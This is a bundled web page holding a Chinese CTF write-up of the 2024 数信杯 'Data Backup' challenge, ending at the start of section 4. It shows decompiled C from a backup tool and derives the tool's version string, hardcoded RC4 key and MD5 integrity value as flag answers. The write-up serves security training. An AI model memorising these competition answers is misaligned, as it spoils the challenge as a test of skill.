"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1740],{69311:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>t,contentTitle:()=>l,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>f});var s=i(36406),r=i(74848),c=i(28453);const a={slug:"2024sxb Scenario-Race Data-Backup",title:"2024 \u6570\u4fe1\u676f - \u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd",authors:"Randark",tags:["CTF","Incident-Response"]},l=void 0,t={authorsImageUrls:[void 0]},f=[{value:"1. \u7248\u672c\u4fe1\u606f",id:"1-\u7248\u672c\u4fe1\u606f",level:2},{value:"2. \u89e3\u5bc6\u7684\u5bc6\u94a5",id:"2-\u89e3\u5bc6\u7684\u5bc6\u94a5",level:2},{value:"3. \u5b8c\u6574\u6027\u6821\u9a8c\u503c",id:"3-\u5b8c\u6574\u6027\u6821\u9a8c\u503c",level:2},{value:"4. \u6062\u590d\u88ab\u7834\u574f\u7684\u6e90\u7801\u5907\u4efd\u6587\u4ef6",id:"4-\u6062\u590d\u88ab\u7834\u574f\u7684\u6e90\u7801\u5907\u4efd\u6587\u4ef6",level:2},{value:"\u57fa\u4e8e offset \u624b\u52a8\u5904\u7406",id:"\u57fa\u4e8e-offset-\u624b\u52a8\u5904\u7406",level:3},{value:"\u57fa\u4e8e\u52a8\u8c03\u62ff\u5230\u6587\u4ef6\u6570\u636e",id:"\u57fa\u4e8e\u52a8\u8c03\u62ff\u5230\u6587\u4ef6\u6570\u636e",level:3},{value:"5. \u5206\u6790\u540e\u95e8\u6587\u4ef6\u7684\u8fde\u63a5\u5730\u5740",id:"5-\u5206\u6790\u540e\u95e8\u6587\u4ef6\u7684\u8fde\u63a5\u5730\u5740",level:2}];function _(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",...(0,c.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.p,{children:"2024 \u6570\u4fe1\u676f - \u6570\u636e\u5b89\u5168\u7efc\u5408\u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd \u9898\u76ee\u5206\u6790"}),"\n",(0,r.jsx)(n.p,{children:"\u9996\u5148\uff0c\u670d\u52a1\u5668\u7684\u73af\u5883\u6ca1\u6709\u4efb\u4f55\u4f5c\u7528\uff0c\u6838\u5fc3\u90fd\u5728\u670d\u52a1\u5668\u4e0a\u83b7\u53d6\u7684\u4e24\u4e2a\u6837\u672c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"myback\n202410311935.cbak\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u9644\u4ef6\u53ef\u4ee5\u5728 ",(0,r.jsx)(n.a,{href:"https://github.com/CTF-Archives/2024-shuxincup/releases/download/v0.1/Data-Backup.zip",children:"Release \u9644\u4ef6\u4e0b\u8f7d - Data-Backup.zip \xb7 CTF-Archives/2024-shuxincup"})," \u83b7\u53d6\u5f97\u5230"]}),"\n",(0,r.jsx)(n.p,{children:"\u4e00\u4e2a\u662f\u5907\u4efd\u5de5\u5177\uff0c\u4e00\u4e2a\u662f\u6267\u884c\u5907\u4efd\u4e4b\u540e\u5f97\u5230\u7684\u88ab\u7834\u574f\u7684\u5907\u4efd\u6587\u4ef6"}),"\n",(0,r.jsx)(n.p,{children:"\u9996\u5148\uff0c\u5148\u5c1d\u8bd5\u6267\u884c\u4e00\u4e0b\u5907\u4efd\u5de5\u5177"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(79510).A+"",width:"1084",height:"797"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\n\u2514\u2500$ ./myback\nMenu:\n1. Backup File\n2. Restore Files\n3. Print Info\n4. Exit\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\uff0c\u6839\u636e\u6bd4\u8d5b\u65f6\u7684\u9898\u76ee\u5148\u5b8c\u6210\u4e00\u4e0b\u9898\u76ee"}),"\n",(0,r.jsx)(n.h2,{id:"1-\u7248\u672c\u4fe1\u606f",children:"1. \u7248\u672c\u4fe1\u606f"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u5907\u4efd\u5de5\u5177 myback \u7a0b\u5e8f\uff0c\u83b7\u53d6\u5907\u4efd\u5de5\u5177\u7684\u7248\u672c\u4fe1\u606f\u3002"}),"\n",(0,r.jsxs)(n.p,{children:["\u7248\u672c\u4fe1\u606f\u4e3a\u4e00\u4e32\u7c7b\u4f3c ",(0,r.jsx)(n.code,{children:"***.***.***"})," \u7684\u5b57\u7b26\u4e32\uff0c\u6ce8\u610f\u661f\u53f7\u4e0d\u5177\u6709\u5360\u4f4d\u610f\u4e49\uff0c\u4e0d\u4ee3\u8868\u5177\u4f53\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u82e5\u83b7\u53d6\u7684\u7248\u672c\u4fe1\u606f\u4e3a\uff1a123.456.789\uff0c\u5219\u63d0\u4ea4\u7684 \u6848\u4e3a\uff1a123.456.789\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u7b2c\u4e00\u79cd\u505a\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7a0b\u5e8f\u6765\u83b7\u5f97"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\n\u2514\u2500$ ./myback\nMenu:\n1. Backup File\n2. Restore Files\n3. Print Info\n4. Exit\nEnter your choice: 3\nBcakup_programe version:3.85.4h6\nThis program is used for backing up and restoring files.\nChoose 1 to back up files in the specified directory to the current program directory and output a cbak file.\nChoose 2 to restore the specified backup file to the current program directory.\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u7528 IDA \u76f4\u63a5\u9006\u5411\u5206\u6790"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'int __fastcall main(int argc, const char **argv, const char **envp)\n{\n    int choice; // [rsp+14h] [rbp-Ch] BYREF\n    unsigned __int64 v5; // [rsp+18h] [rbp-8h]\n\n    v5 = __readfsqword(0x28u);\n    puts("Menu:");\n    puts("1. Backup File");\n    puts("2. Restore Files");\n    puts("3. Print Info");\n    puts("4. Exit");\n    printf("Enter your choice:");\n    __isoc99_scanf("%d", &choice);\n    if (choice == 4)\n    {\n        puts("Exiting program.");\n        exit(0);\n    }\n    if (choice> 4 )\n        goto LABEL_11;\n    switch (choice)\n    {\n        case 3:\n            print_info();\n            break;\n        case 1:\n            puts("Please enter the path of the directory to be backed up:");\n            __isoc99_scanf("%s", backup_file_dir);\n            backup_file(backup_file_dir);\n            break;\n        case 2:\n            puts("Please enter the backup file name to be restored:");\n            __isoc99_scanf("%s", restore_file);\n            restore_files(restore_file);\n            break;\n        default:\nLABEL_11:\n        puts("Invalid choice. Please try again.");\n        return 0;\n    }\n    return 0;\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u4e00\u4e2a\u7b80\u5355\u7684\u83dc\u5355\u903b\u8f91\uff0c\u8ddf\u8fdb ",(0,r.jsx)(n.code,{children:"print_info()"})," \u51fd\u6570"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'void __cdecl print_info()\n{\n    printf("Bcakup_programe version:%s\\n", "3.85.4h6");\n    puts("This program is used for backing up and restoring files.");\n    puts("Choose 1 to back up files in the specified directory to the current program directory and output a cbak file.");\n    puts("Choose 2 to restore the specified backup file to the current program directory.");\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u540c\u6837\u53ef\u4ee5\u5f97\u5230\u7b54\u6848"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"3.85.4h6\n"})}),"\n",(0,r.jsx)(n.h2,{id:"2-\u89e3\u5bc6\u7684\u5bc6\u94a5",children:"2. \u89e3\u5bc6\u7684\u5bc6\u94a5"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u5907\u4efd\u6062\u590d\u5de5\u5177 myback \u4e2d\u7684\u5907\u4efd / \u6062\u590d\u903b\u8f91\uff0c\u627e\u5230\u7528\u4e8e\u89e3\u5bc6\u7684\u5bc6\u94a5\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u82e5\u627e\u5230\u7528\u4e8e\u89e3\u5bc6\u7684\u5bc6\u94a5\u4e3a\u5b57\u7b26\u4e32 123456\u3002\u5219\u63d0\u4ea4\u6700\u7ec8 \u6848\u4e3a\uff1a123456\u3002"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u9898\u76ee\u8981\u6c42\u7684\u662f\u89e3\u5bc6\u7b97\u6cd5\u7684\u5bc6\u94a5\uff0c\u90a3\u4e48\u89e3\u5bc6\u5e38\u89c1\u4e8e restore \u529f\u80fd\uff0c\u5373\u57fa\u4e8e\u83dc\u5355\u903b\u8f91\u8ddf\u8fdb ",(0,r.jsx)(n.code,{children:"restore_files()"})," \u51fd\u6570"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'void __cdecl restore_files(const char *backup_file_path)\n{\n    __int64 v1; // rdx\n    restore_files::FileInfo *v2; // rax\n    __int64 v3; // rbx\n    __int64 v4; // rbx\n    int offset; // [rsp+10h] [rbp-E0h]\n    int offseta; // [rsp+10h] [rbp-E0h]\n    int file_info_count; // [rsp+14h] [rbp-DCh]\n    int min_data_offset; // [rsp+18h] [rbp-D8h]\n    int i; // [rsp+1Ch] [rbp-D4h]\n    restore_files::FileInfo *file_info_list; // [rsp+20h] [rbp-D0h]\n    FILE *backup_file; // [rsp+28h] [rbp-C8h]\n    signed __int64 backup_file_size; // [rsp+30h] [rbp-C0h]\n    unsigned __int8 *backup_file_buffer; // [rsp+38h] [rbp-B8h]\n    restore_files::FileInfo *info_0; // [rsp+48h] [rbp-A8h]\n    unsigned __int8 *encrypted_data; // [rsp+50h] [rbp-A0h]\n    size_t data_length; // [rsp+58h] [rbp-98h]\n    unsigned __int8 *decrypted_data; // [rsp+60h] [rbp-90h]\n    FILE *output_file; // [rsp+68h] [rbp-88h]\n    restore_files::FileInfo info; // [rsp+70h] [rbp-80h] BYREF\n    char version[9]; // [rsp+97h] [rbp-59h] BYREF\n    unsigned __int8 stored_md5_sum[16]; // [rsp+A0h] [rbp-50h] BYREF\n    unsigned __int8 calculated_md5_sum[16]; // [rsp+B0h] [rbp-40h] BYREF\n    char log_file_name[21]; // [rsp+C0h] [rbp-30h] BYREF\n    unsigned __int64 v24; // [rsp+D8h] [rbp-18h]\n\n    v24 = __readfsqword(0x28u);\n    backup_file = fopen(backup_file_path, "rb");\n    if (backup_file)\n    {\n        fseek(backup_file, 0LL, 2);\n        backup_file_size = ftell(backup_file);\n        fseek(backup_file, 0LL, 0);\n        backup_file_buffer = (unsigned __int8 *)malloc(backup_file_size);\n        if (backup_file_buffer)\n        {\n            if (fread(backup_file_buffer, 1uLL, backup_file_size, backup_file) == backup_file_size )\n            {\n                fclose(backup_file);\n                if (!memcmp(backup_file_buffer, "CBAK", 4uLL) )\n                {\n                    v1 = *(_QWORD *)(backup_file_buffer + 12);\n                    *(_QWORD *)stored_md5_sum = *(_QWORD *)(backup_file_buffer + 4);\n                    *(_QWORD *)&stored_md5_sum[8] = v1;\n                    calculate_md5(backup_file_buffer + 20, backup_file_size - 20, calculated_md5_sum);\n                    if (!memcmp(stored_md5_sum, calculated_md5_sum, 0x10uLL) )\n                    {\n                        memset(version, 0, sizeof(version));\n                        *(_QWORD *)version = *(_QWORD *)(backup_file_buffer + 20);\n                        memset(log_file_name, 0, sizeof(log_file_name));\n                        memcpy(log_file_name, backup_file_buffer + 28, 0x14uLL);\n                        offset = 48;\n                        file_info_list = 0LL;\n                        file_info_count = 0;\n                        min_data_offset = backup_file_size;\n                        while (offset < min_data_offset && backup_file_size>= offset + 32 )\n                        {\n                            memset(&info, 0, sizeof(info));\n                            memcpy(&info, &backup_file_buffer[offset], 0x18uLL);\n                            info.filename[24] = 0;\n                            offseta = offset + 24;\n                            info.file_size = *(_DWORD *)&backup_file_buffer[offseta];\n                            offseta += 4;\n                            info.file_offset = *(_DWORD *)&backup_file_buffer[offseta];\n                            offset = offseta + 4;\n                            if (min_data_offset> info.file_offset )\n                                min_data_offset = info.file_offset;\n                            file_info_list = (restore_files::FileInfo *)realloc(file_info_list, 36LL * (file_info_count + 1));\n                            if (!file_info_list)\n                            {\n                                puts(&byte_425A);\n                                free(backup_file_buffer);\n                                return;\n                            }\n                            v2 = &file_info_list[file_info_count];\n                            v3 = *(_QWORD *)&info.filename[8];\n                            *(_QWORD *)v2->filename = *(_QWORD *)info.filename;\n                            *(_QWORD *)&v2->filename[8] = v3;\n                            v4 = *(_QWORD *)&info.filename[24];\n                            *(_QWORD *)&v2->filename[16] = *(_QWORD *)&info.filename[16];\n                            *(_QWORD *)&v2->filename[24] = v4;\n                            v2->file_offset = info.file_offset;\n                            ++file_info_count;\n                        }\n                        for (i = 0; i < file_info_count; ++i)\n                        {\n                            info_0 = &file_info_list[i];\n                            if (info_0->filename[0] != 46 )\n                            {\n                                if (backup_file_size>= info_0->file_offset + info_0->file_size )\n                                {\n                                    encrypted_data = &backup_file_buffer[info_0->file_offset];\n                                    data_length = info_0->file_size;\n                                    decrypted_data = (unsigned __int8 *)malloc(data_length);\n                                    if (decrypted_data)\n                                    {\n                                        memcpy(decrypted_data, encrypted_data, data_length);\n                                        // highlight-next-line\n                                        rc4_encrypt("30048-0bea264-c01c6ea3-e5047d488", 32, decrypted_data, data_length);\n                                        output_file = fopen(info_0->filename, "wb");\n                                        if (output_file)\n                                        {\n                                            fwrite(decrypted_data, 1uLL, data_length, output_file);\n                                            fclose(output_file);\n                                        }\n                                        else\n                                        {\n                                            printf(&byte_430C, info_0);\n                                        }\n                                        free(decrypted_data);\n                                    }\n                                    else\n                                    {\n                                        printf(&byte_42E8, info_0);\n                                    }\n                                }\n                                else\n                                {\n                                    printf(&byte_42C0, info_0);\n                                }\n                            }\n                        }\n                        free(file_info_list);\n                        free(backup_file_buffer);\n                    }\n                    else\n                    {\n                        puts(aMd5);\n                        free(backup_file_buffer);\n                    }\n                }\n                else\n                {\n                    puts(&byte_4289);\n                    free(backup_file_buffer);\n                }\n            }\n            else\n            {\n                puts(&byte_426D);\n                free(backup_file_buffer);\n                fclose(backup_file);\n            }\n        }\n        else\n        {\n            puts(&byte_425A);\n            fclose(backup_file);\n        }\n    }\n    else\n    {\n        printf(&byte_423C, backup_file_path);\n    }\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u903b\u8f91\u6bd4\u8f83\u957f\uff0c\u4f46\u662f\u5728\u5176\u4e2d\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u90e8\u5206"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'rc4_encrypt("30048-0bea264-c01c6ea3-e5047d488", 32, decrypted_data, data_length);\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5f97\u76ca\u4e8e\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u6ca1\u6709\u88ab\u53bb\u9664\uff0c\u53ef\u4ee5\u76f4\u63a5\u5f97\u77e5\u8fd9\u90e8\u5206\u5c31\u662f ",(0,r.jsx)(n.code,{children:"RC4"})," \u6d41\u52a0\u5bc6\u7b97\u6cd5"]}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u6839\u636e\u51fd\u6570\u7684\u5b9a\u4e49"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"void __cdecl rc4_encrypt(unsigned __int8 *key, int key_len, unsigned __int8 *data, int data_len)\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c31\u53ef\u4ee5\u786e\u5b9a ",(0,r.jsx)(n.code,{children:"RC4"})," \u7b97\u6cd5\u7684\u5bc6\u94a5"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"30048-0bea264-c01c6ea3-e5047d488\n"})}),"\n",(0,r.jsx)(n.h2,{id:"3-\u5b8c\u6574\u6027\u6821\u9a8c\u503c",children:"3. \u5b8c\u6574\u6027\u6821\u9a8c\u503c"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u5907\u4efd\u6062\u590d\u5de5\u5177 myback \u5728\u751f\u6210\u5907\u4efd\u6587\u4ef6\u7684\u903b\u8f91\uff0c\u53d1\u73b0\u5907\u4efd\u5de5\u5177\u4f7f\u7528\u4e00\u79cd\u5e38\u89c1\u7684\u65b9\u5f0f\u6765\u6821\u9a8c\u5907\u4efd\u6587\u4ef6\u7684\u5b8c\u6574\u6027\uff0c\u5e76\u4e14\u5c06\u751f\u6210\u7684\u5b8c\u6574\u6027\u6821\u9a8c\u5b57\u7b26\u4e32\u4fdd\u5b58\u5728\u4e86\u5907\u4efd\u6587\u4ef6\u4e2d\uff0c\u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u5de5\u5177\uff0c\u627e\u5230\u5907\u4efd\u6587\u4ef6 202410311935.cbak \u5b8c\u6574\u6027\u6821\u9a8c\u503c\u3002"}),"\n",(0,r.jsxs)(n.p,{children:["\u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u5b8c\u6574\u6027\u7684\u6821\u9a8c\u503c\u4f7f\u7528\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u5982\u82e5\u5b8c\u6574\u6027\u6821\u9a8c\u503c\u7684 16 \u8fdb\u5236\u4e3a ",(0,r.jsx)(n.code,{children:"3A 32 33 34 35 36 37 38 39 30"}),"\uff0c\u5219\u5e94\u63d0\u4ea4\u7684 \u6848\u4e3a ",(0,r.jsx)(n.code,{children:"3A323334353637383930"}),"\uff0c\u7a7a\u683c\u4ec5\u4e3a\u663e\u793a\u6548\u679c\uff0c\u975e\u7b54\u6848\u4e2d\u5b57\u7b26\u3002 \u6848\u4e2d\u6240\u6709\u7684\u82f1\u6587\u5b57\u7b26\u5747\u4e3a\u5927\u5199\u5b57\u7b26\u3002"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u5e38\u89c1\u7684\u6821\u9a8c\u503c\u7b97\u6cd5\uff0c\u5c31\u662f MD5"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u53cd\u7f16\u8bd1\u7684\u51fd\u6570\u5217\u8868\u4e2d\uff0c\u5b9a\u4f4d\u5230 ",(0,r.jsx)(n.code,{children:"calculate_md5()"})," \u51fd\u6570"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"void __cdecl calculate_md5(const unsigned __int8 *data, size_t length, unsigned __int8 *md5_sum)\n{\n    MD5_CTX ctx; // [rsp+20h] [rbp-70h] BYREF\n    unsigned __int64 v5; // [rsp+88h] [rbp-8h]\n\n    v5 = __readfsqword(0x28u);\n    MD5_Init(&ctx);\n    MD5_Update(&ctx, data, length);\n    MD5_Final(md5_sum, &ctx);\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u90a3\u4e48\uff0c\u67e5\u770b ",(0,r.jsx)(n.code,{children:"calculate_md5()"})," \u51fd\u6570\u7684\u4ea4\u53c9\u5f15\u7528"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(31825).A+"",width:"934",height:"253"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230 ",(0,r.jsx)(n.code,{children:"backup_file()"})," \u51fd\u6570\u548c ",(0,r.jsx)(n.code,{children:"restore_files()"})," \u51fd\u6570\u90fd\u5f15\u7528\u4e86 ",(0,r.jsx)(n.code,{children:"calculate_md5()"})," \u51fd\u6570"]}),"\n",(0,r.jsxs)(n.p,{children:["\u4ee5 ",(0,r.jsx)(n.code,{children:"backup_file()"})," \u51fd\u6570\u4e3a\u4f8b\uff0c\u8fdb\u884c\u5206\u6790"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'void __cdecl backup_file(const char *file_dir)\n{\n    __int64 v1; // rdx\n    int file; // eax\n    size_t v3; // rax\n    char *v4; // rcx\n    __int64 v5; // rdx\n    __int64 v6; // rdx\n    __int64 v7; // rdx\n    int index; // [rsp+18h] [rbp-DE8h]\n    int indexa; // [rsp+18h] [rbp-DE8h]\n    int file_block_buf_offset; // [rsp+1Ch] [rbp-DE4h]\n    int file_info_buf_offset; // [rsp+20h] [rbp-DE0h]\n    int hidden_file_count; // [rsp+24h] [rbp-DDCh]\n    int count; // [rsp+28h] [rbp-DD8h]\n    int final_file_buf_offset; // [rsp+2Ch] [rbp-DD4h]\n    __int64 current_file_size; // [rsp+38h] [rbp-DC8h]\n    size_t i; // [rsp+40h] [rbp-DC0h]\n    size_t i_0; // [rsp+48h] [rbp-DB8h]\n    char *file_block_buf; // [rsp+50h] [rbp-DB0h]\n    char *final_file_buffer; // [rsp+58h] [rbp-DA8h]\n    char *file_buffer; // [rsp+60h] [rbp-DA0h]\n    char *file_name_start; // [rsp+70h] [rbp-D90h]\n    size_t file_buffer_length; // [rsp+78h] [rbp-D88h]\n    char log_file_name[20]; // [rsp+80h] [rbp-D80h] BYREF\n    char current_file_name[24]; // [rsp+A0h] [rbp-D60h] BYREF\n    char current_file_info[32]; // [rsp+C0h] [rbp-D40h] BYREF\n    char log_message[256]; // [rsp+E0h] [rbp-D20h] BYREF\n    char file_info_buf[1024]; // [rsp+1E0h] [rbp-C20h] BYREF\n    char file_name_buf[2048]; // [rsp+5E0h] [rbp-820h] BYREF\n    unsigned __int64 v29; // [rsp+DE8h] [rbp-18h]\n\n    v29 = __readfsqword(0x28u);\n    count = get_file_names_unix(file_dir, file_name_buf, 2048);\n    file_block_buf = (char *)malloc(0xA00000uLL);\n    final_file_buffer = (char *)malloc(0xA00000uLL);\n    hidden_file_count = 0;\n    index = 0;\n    for (i = 0LL; i < count; ++i)\n    {\n        if (file_name_buf[index + 1 + strlen(file_dir)] == 46 )\n        ++hidden_file_count;\n        index += strlen(&file_name_buf[index]) + 1;\n    }\n    memcpy(final_file_buffer, "CBAK", 4uLL);\n    memcpy(final_file_buffer + 20, "3.85.4h6", 8uLL);\n    memset(log_file_name, 0, sizeof(log_file_name));\n    memcpy(log_file_name, "backup.log", 0xAuLL);\n    v1 = *(_QWORD *)&log_file_name[8];\n    *(_QWORD *)(final_file_buffer + 28) = *(_QWORD *)log_file_name;\n    *(_QWORD *)(final_file_buffer + 36) = v1;\n    *((_DWORD *)final_file_buffer + 11) = *(_DWORD *)&log_file_name[16];\n    indexa = 0;\n    file_info_buf_offset = 0;\n    file_block_buf_offset = 0;\n    file_buffer = (char *)malloc(0xA00000uLL);\n    for (i_0 = 0LL; i_0 < count; ++i_0)\n    {\n        if (file_name_buf[indexa + 1 + strlen(file_dir)] != 46 )\n        {\n            memset(current_file_name, 0, sizeof(current_file_name));\n            file_name_start = &file_name_buf[indexa + 1 + strlen(file_dir)];\n            strncpy(current_file_name, file_name_start, 0x17uLL);\n            file = read_file(&file_name_buf[indexa], file_buffer);\n            file_buffer_length = file;\n            if (file)\n            {\n                rc4_encrypt("30048-0bea264-c01c6ea3-e5047d488", 32, (unsigned __int8 *)file_buffer, file);\n                LODWORD(current_file_size) = file_buffer_length;\n                HIDWORD(current_file_size) = 32 * (count - hidden_file_count) + 48 + file_block_buf_offset;\n                memcpy(&file_block_buf[file_block_buf_offset], file_buffer, file_buffer_length);\n                file_block_buf_offset += file_buffer_length;\n                memset(current_file_info, 0, sizeof(current_file_info));\n                v3 = strlen(current_file_name);\n                memcpy(current_file_info, current_file_name, v3);\n                *(_QWORD *)&current_file_info[24] = current_file_size;\n                v4 = &file_info_buf[file_info_buf_offset];\n                v5 = *(_QWORD *)&current_file_info[8];\n                *(_QWORD *)v4 = *(_QWORD *)current_file_info;\n                *((_QWORD *)v4 + 1) = v5;\n                v6 = *(_QWORD *)&current_file_info[24];\n                *((_QWORD *)v4 + 2) = *(_QWORD *)&current_file_info[16];\n                *((_QWORD *)v4 + 3) = v6;\n                file_info_buf_offset += 32;\n                printf("Backup file:%s\\n", &file_name_buf[indexa]);\n                sprintf(log_message, "Backup file: %s", &file_name_buf[indexa]);\n                write_log(log_message);\n            }\n            else\n            {\n                printf(aCanNotReadFile, &file_name_buf[indexa]);\n            }\n        }\n        indexa += strlen(&file_name_buf[indexa]) + 1;\n    }\n    free(file_buffer);\n    memcpy(final_file_buffer + 48, file_info_buf, file_info_buf_offset);\n    memcpy(&final_file_buffer[file_info_buf_offset + 48], file_block_buf, file_block_buf_offset);\n    final_file_buf_offset = file_block_buf_offset + file_info_buf_offset + 48;\n    //  highlight-start\n    calculate_md5(\n        (const unsigned __int8 *)final_file_buffer + 20,\n        final_file_buf_offset - 20,\n        (unsigned __int8 *)current_file_info);\n    //  highlight-end\n    v7 = *(_QWORD *)&current_file_info[8];\n    *(_QWORD *)(final_file_buffer + 4) = *(_QWORD *)current_file_info;\n    *(_QWORD *)(final_file_buffer + 12) = v7;\n    getCurrentTime(current_file_name, 0xFuLL);\n    strcpy(&current_file_name[strlen(current_file_name)], ".cbak");\n    sprintf(log_message, current_file_name);\n    save_file(log_message, final_file_buffer, final_file_buf_offset);\n    free(final_file_buffer);\n    free(file_block_buf);\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u6839\u636e ",(0,r.jsx)(n.code,{children:"calculate_md5()"})," \u51fd\u6570\u7684\u5b9a\u4e49\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570 ",(0,r.jsx)(n.code,{children:"data"})," \u6570\u636e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570 ",(0,r.jsx)(n.code,{children:"lenth"})," \u6570\u636e\u957f\u5ea6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570 ",(0,r.jsx)(n.code,{children:"md5_sum"})," \u4e3a MD5 \u8ba1\u7b97\u7ed3\u679c"]}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u53ef\u4ee5\u77e5\u9053"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["\u53d8\u91cf ",(0,r.jsx)(n.code,{children:"current_file_info"})," \u4e3a\u539f\u59cb ",(0,r.jsx)(n.code,{children:"calculate_md5()"})," \u51fd\u6570\u7684\u8ba1\u7b97\u7ed3\u679c"]}),"\n",(0,r.jsxs)(n.li,{children:["\u6267\u884c ",(0,r.jsx)(n.code,{children:"v7 = *(_QWORD *)&current_file_info[8];"})," \u5c06 ",(0,r.jsx)(n.code,{children:"current_file_info()"})," \u8ba1\u7b97\u7684\u7ed3\u679c\u53d6\u524d\u516b\u4f4d\u5b58\u5165 ",(0,r.jsx)(n.code,{children:"v7"})]}),"\n",(0,r.jsxs)(n.li,{children:["\u6267\u884c ",(0,r.jsx)(n.code,{children:"*(_QWORD *)(final_file_buffer + 4) = *(_QWORD *)current_file_info;"})," \u5c06 ",(0,r.jsx)(n.code,{children:"current_file_info()"})," \u8ba1\u7b97\u7684\u7ed3\u679c\u4ece ",(0,r.jsx)(n.code,{children:"final_file_buffer"})," \u7684 ",(0,r.jsx)(n.code,{children:"offset = 4"})," \u4f4d\u7f6e\u5b58\u5165"]}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u90a3\u4e48\u8bf4\u660e ",(0,r.jsx)(n.code,{children:"cbak"})," \u6587\u4ef6\u7684 ",(0,r.jsx)(n.code,{children:"offset = 4"})," \u4f4d\u7f6e\u5f00\u59cb\uff0c\u53d6 ",(0,r.jsx)(n.code,{children:"16"})," \u5b57\u8282\u5f97\u5230\u7684\u5c31\u662f\u6587\u4ef6\u7684\u5b8c\u6574\u6027\u6821\u9a8c\u503c"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(73886).A+"",width:"1243",height:"553"})}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u5907\u4efd\u6587\u4ef6\u7684\u5b8c\u6574\u6027\u6821\u9a8c\u503c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"EACDD8510B0F54EA412FA900A2F0645F\n"})}),"\n",(0,r.jsx)(n.h2,{id:"4-\u6062\u590d\u88ab\u7834\u574f\u7684\u6e90\u7801\u5907\u4efd\u6587\u4ef6",children:"4. 